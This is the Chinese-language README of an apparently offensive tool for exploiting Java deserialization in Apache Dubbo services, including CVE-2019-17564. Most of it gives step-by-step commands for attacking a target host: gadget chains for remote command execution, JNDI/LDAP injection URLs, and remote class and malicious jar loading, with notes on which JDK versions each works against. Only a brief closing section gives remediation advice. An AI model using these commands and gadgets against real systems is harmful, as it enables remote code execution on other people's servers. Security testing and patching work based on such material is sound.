*工具仅用于安全研究以及内部自查，禁止使用工具发起非法攻击，造成的后果使用者负责*

## Dubbo反序列化测试工具

## 使用帮助

usage: java -jar exp.jar [OPTION]
- -h --help               帮助信息
- -l --list             输出所有gadget信息
- -g --gadget <arg>          gadget名称
- -a --args <arg>      gadget入参，多个参数使用多次该命令传入，例-a http://127.0.0.1:80/ -a Calc
- -p --protocol <arg>   [dubbo|http] 通讯协议名称，默认缺省dubbo
- -s --serialization <arg>          [hessian|java] 序列化类型，默认缺省hessian
- -t --target <arg>          目标，例：127.0.0.1:20880
- -f --fastcheck <arg>   快速攻击检查（使用预置参数数据文件，遍历所有gadget进行攻击检查），参数为数据文件路径，参考文件check.data

例（快速攻击检测，若不指定序列化类型，则全部gadget都会尝试）：
```
java -jar dubbo-exp.jar
--target 127.0.0.1:20881 
--fastcheck /Users/threedr3am/dubbo-exp/check.data
```
check.dat预置参数文件内容：
```
### 快速漏洞攻击参数配置（将会根据相应匹配的参数选择对应的所有gadget攻击）
### 多个参数英文逗号分割

#JNDI注入url，JNDI注入需要考虑对方jdk版本，若是jdk8，
# 当小于jdk8u121，可以使用rmi服务进行JNDI注入攻击，
# jdk8u121～jdk8u191之间可以选择ldap服务替代，
# jdk8u191+需要使用tomcat-el依赖打法，或者使用gadget
JNDI=ldap://127.0.0.1:43658/Calc

#执行的shell命令
CMD=/System/Applications/Calculator.app/Contents/MacOS/Calculator
#或者 CMD=/bin/bash,-c,/System/Applications/Calculator.app/Contents/MacOS/Calculator

#Reference远程class代码url
CODEBASE=http://127.0.0.1:80,Calc

#恶意jar包url
JAR=http://127.0.0.1:8080/R.jar,Calc

#DNS服务url
DNS=http://xxxx.ceye.io
```

例（测试dubbo默认缺省情况下使用的dubbo协议+hessian2反序列化）：
```

--target
127.0.0.1:20881
--protocol
dubbo
--serialization
hessian
--gadget
rome
--args
ldap://127.0.0.1:43658/Calc
```

例（测试dubbo在使用http协议+java反序列化，dubbo < 2.7.5前使用http协议，后续改为了jsonrpc）CVE-2019-17564：
```
--target
127.0.0.1:8080/org.apache.dubbo.samples.http.api.DemoService
--protocol
http
--serialization
java
--gadget
CommonsCollections8
--args
/System/Applications/Calculator.app/Contents/MacOS/Calculator
```
例（多参数的使用）：
```
--target
127.0.0.1:8080/org.apache.dubbo.samples.http.api.DemoService
--protocol
http
--serialization
java
--gadget
CommonsCollections8
--args
'touch /tmp/dubbo.test'
```
或
```
--target
127.0.0.1:8080/org.apache.dubbo.samples.http.api.DemoService
--protocol
http
--serialization
java
--gadget
CommonsCollections8
--args
'/bin/bash'
--args
'-c'
--args
'touch /tmp/dubbo.test'
```
## gadget列表

---------------------------------------------------------------------------------------------------------
1. 名称：resin
2. 需要入参数量：2
3. 参数说明：arg[0]=恶意类所在web服务器ip，arg[1]=恶意类类名，此处需要恶意类无包名编译出来的
4. 序列化类型：hessian
5. 依赖：com.caucho:quercus:*
---------------------------------------------------------------------------------------------------------
1. 名称：rome
2. 需要入参数量：1
3. 参数说明：arg[0]=ldap引用外部class地址，例：ldap://127.0.0.1:43658/Calc（ldap协议的JNDI服务可打jdk8u191及以下版本，大于jdk8u191需要使用gadget字节码）
4. 序列化类型：hessian
5. 依赖：com.rometools:rome:*
---------------------------------------------------------------------------------------------------------
1. 名称：spring-aop
2. 需要入参数量：1
3. 参数说明：arg[0]=ldap引用外部class地址，例：ldap://127.0.0.1:43658/Calc（ldap协议的JNDI服务可打jdk8u191及以下版本，大于jdk8u191需要使用gadget字节码）
4. 序列化类型：hessian
5. 依赖：org.springframework:spring-aop
---------------------------------------------------------------------------------------------------------
1. 名称：xbean
2. 需要入参数量：2
3. 参数说明：arg[0]=恶意类所在web服务器ip，arg[1]=恶意类类名，此处需要恶意类无包名编译出来的
4. 序列化类型：hessian
5. 依赖：org.apache.xbean:xbean-naming:*
---------------------------------------------------------------------------------------------------------
1. 名称：CommonsBeanutils
2. 需要入参数量：1
3. 参数说明：arg[0]=ldap引用外部class地址，例：ldap://127.0.0.1:43658/Calc（ldap协议的JNDI服务可打jdk8u191及以下版本，大于jdk8u191需要使用gadget字节码）
4. 序列化类型：java
5. 依赖：
---------------------------------------------------------------------------------------------------------
1. 名称：CommonsBeanutils1
2. 需要入参数量：1
3. 参数说明：arg[0]=cmd
4. 序列化类型：java
5. 依赖：commons-beanutils:commons-beanutils:1.9.2
---------------------------------------------------------------------------------------------------------
1. 名称：CommonsCollections1
2. 需要入参数量：1
3. 参数说明：arg[0]=cmd
4. 序列化类型：java
5. 依赖：commons-collections:commons-collections:3.1
---------------------------------------------------------------------------------------------------------
1. 名称：CommonsCollections2
2. 需要入参数量：1
3. 参数说明：arg[0]=cmd
4. 序列化类型：java
5. 依赖：org.apache.commons:commons-collections4:4.0
---------------------------------------------------------------------------------------------------------
1. 名称：CommonsCollections3
2. 需要入参数量：1
3. 参数说明：arg[0]=cmd
4. 序列化类型：java
5. 依赖：commons-collections:commons-collections:3.1
---------------------------------------------------------------------------------------------------------
1. 名称：CommonsCollections3ForLoadJar
2. 需要入参数量：2
3. 参数说明：arg[0]=jar包下载地址，arg[1]=jar包中恶意类名称
4. 序列化类型：java
5. 依赖：commons-collections:commons-collections:3.1
---------------------------------------------------------------------------------------------------------
1. 名称：CommonsCollections4
2. 需要入参数量：1
3. 参数说明：arg[0]=cmd
4. 序列化类型：java
5. 依赖：commons-collections:commons-collections:3.1
---------------------------------------------------------------------------------------------------------
1. 名称：CommonsCollections5
2. 需要入参数量：1
3. 参数说明：arg[0]=cmd
4. 序列化类型：java
5. 依赖：commons-collections:commons-collections:3.1
---------------------------------------------------------------------------------------------------------
1. 名称：CommonsCollections5ForLoadJar
2. 需要入参数量：2
3. 参数说明：arg[0]=jar包下载地址，arg[1]=jar包中恶意类名称
4. 序列化类型：java
5. 依赖：commons-collections:commons-collections:3.1
---------------------------------------------------------------------------------------------------------
1. 名称：CommonsCollections6
2. 需要入参数量：1
3. 参数说明：arg[0]=cmd
4. 序列化类型：java
5. 依赖：commons-collections:commons-collections:3.1
---------------------------------------------------------------------------------------------------------
1. 名称：CommonsCollections6ForLoadJar
2. 需要入参数量：2
3. 参数说明：arg[0]=jar包下载地址，arg[1]=jar包中恶意类名称
4. 序列化类型：java
5. 依赖：commons-collections:commons-collections:3.1
---------------------------------------------------------------------------------------------------------
1. 名称：CommonsCollections7
2. 需要入参数量：1
3. 参数说明：arg[0]=cmd
4. 序列化类型：java
5. 依赖：commons-collections:commons-collections:3.1
---------------------------------------------------------------------------------------------------------
1. 名称：CommonsCollections8
2. 需要入参数量：1
3. 参数说明：arg[0]=cmd
4. 序列化类型：java
5. 依赖：org.apache.commons:commons-collections4:4.0
---------------------------------------------------------------------------------------------------------
1. 名称：CommonsCollections9
2. 需要入参数量：1
3. 参数说明：arg[0]=cmd
4. 序列化类型：java
5. 依赖：commons-collections:commons-collections:3.1
---------------------------------------------------------------------------------------------------------
1. 名称：CommonsCollections10
2. 需要入参数量：1
3. 参数说明：arg[0]=cmd
4. 序列化类型：java
5. 依赖：commons-collections:commons-collections:3.1
---------------------------------------------------------------------------------------------------------
1. 名称：CommonsCollections11
2. 需要入参数量：1
3. 参数说明：arg[0]=cmd
4. 序列化类型：java
5. 依赖：commons-collections:commons-collections:3.2.1
---------------------------------------------------------------------------------------------------------
1. 名称：URLDNS
2. 需要入参数量：1
3. 参数说明：arg[0]=dns server url
4. 序列化类型：java
5. 依赖：java runtime

## 漏洞修复建议
- 默认缺省的dubbo协议hessian反序列化漏洞：参考 [learnjavabug](https://github.com/threedr3am/learnjavabug)项目module->dubbo/dubbo-hessian2-safe-reinforcement，使用反序列化黑名单形式进行安全加固
- dubbo版本<2.7.5，http协议反序列化漏洞（CVE-2019-17564）：升级到最新版本2.7.5修复